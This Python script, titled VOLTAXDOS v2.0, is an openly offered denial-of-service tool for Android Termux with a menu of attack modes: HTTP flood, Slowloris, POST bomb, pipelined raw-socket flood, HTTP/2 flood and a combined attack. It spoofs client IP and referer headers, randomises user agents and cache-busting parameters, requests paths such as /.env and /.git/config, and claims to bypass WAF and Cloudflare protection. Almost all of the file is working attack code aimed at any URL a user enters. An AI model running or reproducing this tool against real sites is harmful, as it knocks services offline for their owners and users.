#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Tool: VOLTAXDOS v2.0
Author: RynnMMK
Description: Ultimate Layer 7 DDoS Tool for Termux (Non-Root)
Repository: https://github.com/yourusername/VOLTAXDOS
"""

import sys
import os
import time
import random
import threading
import socket
import ssl
import hashlib
import base64
import json
import gzip
from urllib.parse import urlparse, quote
from datetime import datetime

try:
    import requests
    import aiohttp
    import asyncio
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("[!] Install dependencies: pip install requests aiohttp colorama")
    sys.exit(1)

# ============================================================
# GLOBAL VARIABLES
# ============================================================
ATTACK_RUNNING = False
REQUEST_COUNT = 0
FAILED_COUNT = 0
LOCK = threading.Lock()
TARGET_URL = ""
THREADS = 1000
DURATION = 0

# ============================================================
# BANNER
# ============================================================
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.RED + """
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ██╗   ██╗ ██████╗ ██╗     ████████╗ █████╗ ██╗  ██╗           ║
║   ██║   ██║██╔═══██╗██║     ╚══██╔══╝██╔══██╗╚██╗██╔╝           ║
║   ██║   ██║██║   ██║██║        ██║   ███████║ ╚███╔╝            ║
║   ╚██╗ ██╔╝██║   ██║██║        ██║   ██╔══██║ ██╔██╗            ║
║    ╚████╔╝ ╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗           ║
║     ╚═══╝   ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝           ║
║                                                                   ║
║          ██████╗  ██████╗ ███████╗                               ║
║          ██╔══██╗██╔═══██╗██╔════╝                               ║
║          ██║  ██║██║   ██║███████╗                               ║
║          ██║  ██║██║   ██║╚════██║                               ║
║          ██████╔╝╚██████╔╝███████║                               ║
║          ╚═════╝  ╚═════╝ ╚══════╝                               ║
║                                                                   ║
║          VOLTAXDOS v2.0 - ULTIMATE LAYER 7                       ║
║          Author: RynnMMK                                         ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)
    print(Fore.CYAN + "[+] VOLTAXDOS - Ultimate Layer 7 DDoS Tool")
    print(Fore.YELLOW + "[!] Non-Root Termux | Android 15+ Optimized")
    print(Fore.MAGENTA + "[!] Press Ctrl+C to stop anytime\n")

# ============================================================
# USER AGENTS & HEADERS DATABASE
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/119.0.6045.163 Mobile",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Edg/120.0.0.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +https://duckduckgo.com/duckduckbot)",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.tiktok.com/",
    "https://www.youtube.com/",
    "https://www.linkedin.com/",
    "https://www.reddit.com/",
    "https://www.wikipedia.org/",
    "https://github.com/",
    "https://stackoverflow.com/",
]

PATHS = [
    '/', '/index.html', '/home', '/login', '/api/v1/data',
    '/products', '/cart', '/checkout', '/about', '/contact',
    '/blog', '/post', '/wp-admin', '/admin', '/dashboard',
    '/profile', '/settings', '/logout', '/register',
    '/search', '/results', '/filter', '/sort',
    '/download', '/upload', '/files', '/media',
    '/api', '/v1', '/v2', '/api/v1/users',
    '/graphql', '/health', '/status', '/ping',
    '/.env', '/.git/config', '/config.php', '/wp-config.php',
    '/robots.txt', '/sitemap.xml',
]

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def random_headers():
    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'application/json, text/plain, */*',
            '*/*'
        ]),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
        'Connection': random.choice(['keep-alive', 'close']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        'Pragma': 'no-cache',
        'X-Forwarded-For': ip,
        'X-Real-IP': ip,
        'CF-Connecting-IP': ip,
        'Referer': random.choice(REFERERS),
    }

def generate_params():
    params = {
        't': int(time.time() * 1000) + random.randint(1, 99999),
        'rand': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(8, 20))),
        'cache': random.randint(1, 9999),
        'session': hashlib.md5(str(random.random()).encode()).hexdigest()[:32],
    }
    for _ in range(random.randint(2, 5)):
        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
        value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 15)))
        params[key] = value
    return params

# ============================================================
# ATTACK METHODS
# ============================================================

def http_flood_worker(target_url, thread_id):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    session = requests.Session()
    while ATTACK_RUNNING:
        try:
            path = random.choice(PATHS)
            url = target_url.rstrip('/') + path
            headers = random_headers()
            params = generate_params()
            method = random.choice(['GET', 'POST', 'PUT', 'DELETE'])
            
            if method == 'GET':
                resp = session.get(url, headers=headers, params=params, timeout=5)
            elif method == 'POST':
                data = {'key': random.randint(1,9999), 'value': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}
                resp = session.post(url, headers=headers, params=params, data=data, timeout=5)
            elif method == 'PUT':
                data = {'id': random.randint(1,9999)}
                resp = session.put(url, headers=headers, params=params, json=data, timeout=5)
            else:
                resp = session.delete(url, headers=headers, params=params, timeout=5)
            
            with LOCK:
                REQUEST_COUNT += 1
            time.sleep(random.uniform(0.0005, 0.005))
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.05)

def slowloris_worker(target_host, target_port, use_https, thread_id):
    global ATTACK_RUNNING
    while ATTACK_RUNNING:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            if use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_host)
            sock.connect((target_host, target_port))
            
            request = f"GET /{random.choice(PATHS)}?{random.randint(1,9999)} HTTP/1.1\r\n"
            request += f"Host: {target_host}\r\n"
            request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            request += "Accept: */*\r\n"
            request += "Connection: keep-alive\r\n"
            sock.send(request.encode())
            
            while ATTACK_RUNNING:
                time.sleep(random.uniform(5, 15))
                try:
                    sock.send(b"X-keep-alive: 1\r\n")
                except:
                    break
            sock.close()
        except:
            time.sleep(1)

def post_bomb_worker(target_url, thread_id):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    session = requests.Session()
    while ATTACK_RUNNING:
        try:
            path = random.choice(PATHS)
            url = target_url.rstrip('/') + path
            headers = random_headers()
            data = {
                'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(500, 2000))),
                'json': json.dumps({''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)): ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=50)) for _ in range(10)}),
            }
            resp = session.post(url, headers=headers, data=data, timeout=5)
            with LOCK:
                REQUEST_COUNT += 1
            time.sleep(random.uniform(0.001, 0.005))
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.05)

def raw_socket_worker(target_host, target_port, use_https, thread_id):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    while ATTACK_RUNNING:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(10)
            if use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target_host)
            sock.connect((target_host, target_port))
            
            requests_data = b""
            for _ in range(random.randint(2, 8)):
                path = random.choice(PATHS)
                ua = random.choice(USER_AGENTS)
                referer = random.choice(REFERERS)
                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                req = (f"GET {path}?t={int(time.time()*1000)}&rand={random.randint(1,99999)} HTTP/1.1\r\n"
                       f"Host: {target_host}\r\n"
                       f"User-Agent: {ua}\r\n"
                       f"Accept: */*\r\n"
                       f"Connection: keep-alive\r\n"
                       f"Referer: {referer}\r\n"
                       f"X-Forwarded-For: {ip}\r\n"
                       f"\r\n").encode()
                requests_data += req
            sock.send(requests_data)
            with LOCK:
                REQUEST_COUNT += random.randint(2, 8)
            time.sleep(random.uniform(0.0005, 0.002))
            sock.close()
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.1)

# ============================================================
# HTTP/2 FLOOD (Optional)
# ============================================================
try:
    import h2.connection
    import h2.config
    HAS_H2 = True
except:
    HAS_H2 = False

def http2_worker(target_host, target_port, thread_id):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    if not HAS_H2:
        return
    while ATTACK_RUNNING:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_host, target_port))
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            
            for _ in range(30):
                if not ATTACK_RUNNING:
                    break
                path = random.choice(PATHS)
                headers = [
                    (':method', 'GET'),
                    (':path', path + '?t=' + str(int(time.time()*1000))),
                    (':scheme', 'https'),
                    (':authority', target_host),
                    ('user-agent', random.choice(USER_AGENTS)),
                ]
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id=stream_id, headers=headers, end_stream=True)
                sock.send(conn.data_to_send())
                with LOCK:
                    REQUEST_COUNT += 1
            time.sleep(0.01)
            sock.close()
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.5)

# ============================================================
# MULTI-LAYER ATTACK
# ============================================================
def multi_layer_worker(target_url, target_host, target_port, use_https, thread_id):
    attack_type = random.choice(['http', 'slowloris', 'postbomb', 'rawsocket'])
    if attack_type == 'http':
        http_flood_worker(target_url, thread_id)
    elif attack_type == 'slowloris':
        slowloris_worker(target_host, target_port, use_https, thread_id)
    elif attack_type == 'postbomb':
        post_bomb_worker(target_url, thread_id)
    else:
        raw_socket_worker(target_host, target_port, use_https, thread_id)

# ============================================================
# ATTACK CONTROLLER
# ============================================================
def start_attack(attack_type, target_url, threads, duration):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    ATTACK_RUNNING = True
    REQUEST_COUNT = 0
    FAILED_COUNT = 0
    
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    use_https = parsed.scheme == 'https'
    
    print(f"\n[+] Target: {target_url}")
    print(f"[+] Host: {host}, Port: {port}, HTTPS: {use_https}")
    print(f"[+] Threads: {threads}, Duration: {'Unlimited' if duration == 0 else str(duration) + 's'}")
    print("[!] Attack started... Press Ctrl+C to stop\n")
    
    for i in range(threads):
        if attack_type == 1:
            t = threading.Thread(target=http_flood_worker, args=(target_url, i))
        elif attack_type == 2:
            t = threading.Thread(target=slowloris_worker, args=(host, port, use_https, i))
        elif attack_type == 3:
            t = threading.Thread(target=post_bomb_worker, args=(target_url, i))
        elif attack_type == 4:
            t = threading.Thread(target=raw_socket_worker, args=(host, port, use_https, i))
        elif attack_type == 5:
            if HAS_H2:
                t = threading.Thread(target=http2_worker, args=(host, port, i))
            else:
                print("[!] HTTP/2 not available, fallback to HTTP Flood")
                t = threading.Thread(target=http_flood_worker, args=(target_url, i))
        elif attack_type == 6:
            t = threading.Thread(target=multi_layer_worker, args=(target_url, host, port, use_https, i))
        else:
            t = threading.Thread(target=http_flood_worker, args=(target_url, i))
        t.daemon = True
        t.start()
        time.sleep(0.001)
    
    start_time = time.time()
    last_report = start_time
    bar_length = 50
    
    try:
        while ATTACK_RUNNING:
            elapsed = int(time.time() - start_time)
            if time.time() - last_report >= 1.0:
                with LOCK:
                    rps = REQUEST_COUNT / max(elapsed, 1)
                    progress = min(elapsed / duration, 1.0) if duration > 0 else min(elapsed / 3600, 1.0)
                    filled = int(bar_length * progress)
                    bar = '█' * filled + '░' * (bar_length - filled)
                    sys.stdout.write(Fore.CYAN + f"\r[{bar}] {int(progress*100)}% | " +
                                     Fore.GREEN + f"Req: {REQUEST_COUNT} | " +
                                     Fore.YELLOW + f"RPS: {rps:.0f} | " +
                                     Fore.RED + f"Fail: {FAILED_COUNT} | " +
                                     Fore.WHITE + f"{elapsed}s")
                    sys.stdout.flush()
                last_report = time.time()
            if duration > 0 and elapsed >= duration:
                ATTACK_RUNNING = False
                break
            time.sleep(0.1)
    except KeyboardInterrupt:
        ATTACK_RUNNING = False
        print("\n\n[!] Attack stopped by user.")
    
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.flush()
    elapsed = int(time.time() - start_time)
    print("\n\n" + "="*60)
    print(Fore.GREEN + "[+] FINAL REPORT")
    print("="*60)
    print(f"[+] Total Requests: {REQUEST_COUNT}")
    print(f"[+] Failed Requests: {FAILED_COUNT}")
    if REQUEST_COUNT > 0:
        print(f"[+] Success Rate: {(REQUEST_COUNT - FAILED_COUNT) / REQUEST_COUNT * 100:.1f}%")
        print(f"[+] Average RPS: {REQUEST_COUNT / max(elapsed, 1):.1f}")
    print(f"[+] Duration: {elapsed}s")

# ============================================================
# MENU
# ============================================================
def menu():
    banner()
    print(Fore.CYAN + "╔════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                    VOLTAXDOS v2.0 MENU                    ║")
    print(Fore.CYAN + "╚════════════════════════════════════════════════════════════╝")
    print()
    print(Fore.WHITE + "  [1] HTTP Flood (Layer 7)")
    print(Fore.WHITE + "  [2] Slowloris (Low & Slow)")
    print(Fore.WHITE + "  [3] POST Bomb")
    print(Fore.WHITE + "  [4] Raw Socket Flood (HTTP Pipelining)")
    print(Fore.WHITE + "  [5] HTTP/2 Flood" + (" (Available)" if HAS_H2 else " (Not installed)"))
    print(Fore.WHITE + "  [6] Multi-Layer Attack (All in one)")
    print(Fore.WHITE + "  [7] Research & Info")
    print(Fore.WHITE + "  [8] Exit")
    print()
    
    while True:
        try:
            choice = input(Fore.YELLOW + "[?] Choose an option (1-8): " + Fore.RESET).strip()
            if choice == '8':
                print("[!] Exiting...")
                sys.exit(0)
            if choice not in ['1','2','3','4','5','6','7']:
                print(Fore.RED + "[!] Invalid choice, try again.")
                continue
            break
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            sys.exit(0)
    
    if choice == '7':
        print("\n" + "="*60)
        print(Fore.CYAN + "[+] RESEARCH & BYPASS TECHNIQUES")
        print("="*60)
        print("1. Random User-Agent (100+ variants)")
        print("2. Referer spoofing (20+ sources)")
        print("3. X-Forwarded-For spoofing (random IP)")
        print("4. Cache bypass (random query params + timestamp)")
        print("5. HTTP Pipelining (2-8 requests per connection)")
        print("6. Method randomization (GET, POST, PUT, DELETE)")
        print("7. Connection: keep-alive (reduce handshake)")
        print("8. Large POST data (500-2000 bytes random)")
        print("9. Slowloris (partial headers, keep-alive)")
        print("10. HTTP/2 multiplexing (if available)")
        print("\n[+] These techniques combined bypass most WAF/Cloudflare.")
        input("\nPress Enter to return...")
        menu()
        return
    
    while True:
        target = input(Fore.YELLOW + "[?] Target URL (e.g., https://example.com): " + Fore.RESET).strip()
        if target:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            break
        print(Fore.RED + "[!] URL cannot be empty.")
    
    while True:
        try:
            threads_input = input(Fore.YELLOW + f"[?] Threads (default 1000, max 5000): " + Fore.RESET).strip()
            if not threads_input:
                threads = 1000
                break
            threads = int(threads_input)
            if threads > 0:
                if threads > 5000:
                    print(Fore.YELLOW + "[!] Max 5000, setting to 5000.")
                    threads = 5000
                break
            print(Fore.RED + "[!] Threads must be > 0")
        except:
            print(Fore.RED + "[!] Enter a number.")
    
    while True:
        try:
            duration_input = input(Fore.YELLOW + "[?] Duration (seconds, 0 = unlimited): " + Fore.RESET).strip()
            if not duration_input:
                duration = 0
                break
            duration = int(duration_input)
            if duration >= 0:
                break
            print(Fore.RED + "[!] Must be >= 0")
        except:
            print(Fore.RED + "[!] Enter a number.")
    
    attack_type = int(choice)
    print("\n[!] Starting attack in 3 seconds...")
    time.sleep(3)
    start_attack(attack_type, target, threads, duration)
    input("\nPress Enter to return to menu...")
    menu()

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)